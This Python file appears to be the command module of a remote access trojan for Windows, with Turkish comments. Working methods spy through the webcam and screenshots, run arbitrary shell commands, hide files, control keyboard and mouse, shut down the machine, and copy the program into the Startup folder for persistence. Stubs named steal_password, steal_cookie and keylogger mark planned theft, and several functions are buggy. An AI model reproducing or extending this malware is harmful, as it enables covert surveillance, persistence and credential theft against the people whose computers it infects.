import socket, os, cv2, pyautogui, subprocess, ctypes, sys, shutil, webbrowser, time

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from colorama import Fore
from getpass import  getuser

class Functions:
    def list_dir(self):
        self.listdir = os.listdir()
        return self.listdir

    def cd(self, data):
        try:
            self.go = os.chdir(data)
            self.dizin = os.getcwd()
        except Exception as e:
            return f"Error! {e}"

    def get_ip(self):
        self.host_name = socket.gethostname()
        self.ip_adress = socket.gethostbyname()

        return self.ip_adress
    def create_file(self, data):
        try:
            os.mkdir(data)
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"
    def delete_file(self, data):
        try:
            os.rmdir(data)
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"
    def read(self, data):
        try:
            with open(data, "r") as file:
                self.content = file.read()
                return self.content
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"
    def  create_file(self, data):
        try:
            with open(data, 'x') as dosya:
                pass
            return f"{Fore.GREEN}Succsesfully created file!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def dizin(self):
        self.dizin = os.getcwd()

        return self.dizin
    def capture_camera(self):
        self.camera = cv2.VideoCapture(0)

        self.ret, self.frame = self.camera.read()

        if self.ret:
            cv2.imwrite("photo.jpg", self.frame)
            return f"{Fore.GREEN}Succsessfully the taked photo!{Fore.RESET}"
        else:
            return f"{Fore.RED}Error! Failed the capture photo!{Fore.RESET}"

        self.camera.release()

    def steal_password(self):
        #Detaylı şekilde yapılacak o yüzden eksik...
        pass

    def take_screenshot(self):
        self.screenshot = pyautogui.screenshot("error.png")
        return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"

    def voice(self):
        return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"

    def steal_cookie(self):
        return f"{Fore.RED}Currently under development!{Fore.RESET}"

    def steal_history(self):
        return f"{Fore.RED}Currently under development!{Fore.RESET}"

    def kill(self, data):
        try:
            os.system(f"TASKKILL /F /IM {data}")
            return f"{Fore.GREEN}Succsessfully terminated {data}!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def tasklist(self):
        try:
            self.result = subprocess.run(["tasklist"], capture_output=True, text=True)
            return f"{self.result.stdout}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def open_program(self, data):
        try:
            subprocess.Popen([data])
            return f"{Fore.GREEN}Succsessfully opened{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def hide_program(self, data):
        try:
            ctypes.windll.kernel32.SetFileAttributesW(data, 2)
            return f"{Fore.GREEN}Succsessfully hideing the {data}{Fore.RESET}"

        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def unhide_program(self, data):
        try:
            ctypes.windll.kernel32.SetFileAttributesW(data, 0)
            return f"{Fore.GREEN}Succsessfully unhiding the {data}{Fore.RESET}"

        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"
    def rename(self, old_name, new_name):
        try:
            os.rename(old_name, new_name)
            return f"{Fore.GREEN}Succsessfully renamed the {old_name}{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def startup(self):
        try:
            self.program_adi = os.path.basename(sys.argv[0])
            self.hedef_dizin = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            self.program_yolu = os.path.abspath(sys.argv[0])
            try:
                self.hedef_yol = os.path.join(self.hedef_dizin, self.program_adi)
                if not os.path.exists(self.hedef_yol):
                    shutil.copy(self.program_yolu, self.hedef_yol)
                    return f"{self.program_adi} başlangıç klasörüne kopyalandı."
                else:
                    return f"{Fore.RED}Error! {self.program_adi} It already has original parts.{Fore.RESET}"
            except Exception as e:
                return f"{Fore.RED}Error! {e}{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def download(self):
        try:
            #Daha sonra yapılacak o yüzden eksik...
            pass
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def upload(self):
        try:
            #Daha sonra yapılacak o yüzden eksik...
            pass
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def shutdown(self):
        try:
            os.system("shutdown /s /t 2")
            return f"{Fore.GREEN}Succsessfully shutdowning the PC{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def restart(self):
        try:
            os.system("shutdown /r /t 2")
            f"{Fore.GREEN}Succsessfully the restarting!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def shell(self, data):
        try:
            self.shell = subprocess.run(data, shell=True, capture_output=True, text=True)
            return f"{self.shell}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def cmd(self, data):
        try:
            self.cmd = os.system(data)
            return f"{Fore.GREEN}{self.cmd}{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def web(self, data):
        try:
            self.url = data
            webbrowser.open(data)
            return f"{Fore.GREEN}Succsesfully opened the website!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def web_background(self, data):
        try:
            self.url = data
            self.chrome_options = Options()
            self.chrome_options.add_argument("--headless")
            self.driver = webdriver.Chrome(options=self.chrome_options)
            self.driver.get(self.url)
            time.sleep(5)
            self.driver.quit()
            return f"{Fore.GREEN}Opened the website!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error!{e}{Fore.RESET}"

    def ping(self, data):
        try:
            self.url = data
            self.ping =os.system(f"ping {self.url}")
            return f"{Fore.GREEN}Succsesfully the activated CMD code!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def keylogger(self):
        try:
            return f"{Fore.GREEN}Currently under development!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def type(self, data):
        try:
            pyautogui.write(data)
            return f"{Fore.GREEN}Succsessfully write the keyboard!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def press(self, data):
        try:
            pyautogui.press(data)
            return f"{Fore.GREEN}Succsessfully pressed the keyborad!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def moveto(self, x, y):
        try:
            pyautogui.moveTo(x, y)
            return f"{Fore.GREEN}Moved the this cordination {x},{y} mause!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def click(self, data):
        try:
            pyautogui.click(button=str(data))
            return f"{Fore.GREEN}Clicked the {data}{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"
